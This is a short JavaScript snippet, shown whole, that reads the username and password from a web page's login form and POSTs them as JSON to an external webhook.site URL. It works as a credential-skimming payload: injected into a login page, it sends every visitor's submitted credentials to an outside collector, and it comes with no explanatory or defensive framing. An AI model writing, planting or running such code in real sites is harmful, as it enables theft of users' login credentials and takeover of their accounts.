const username = document.querySelector('input[name="username"]')?.value;
const password = document.querySelector('input[name="password"]')?.value;

fetch("https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ username, password })
});
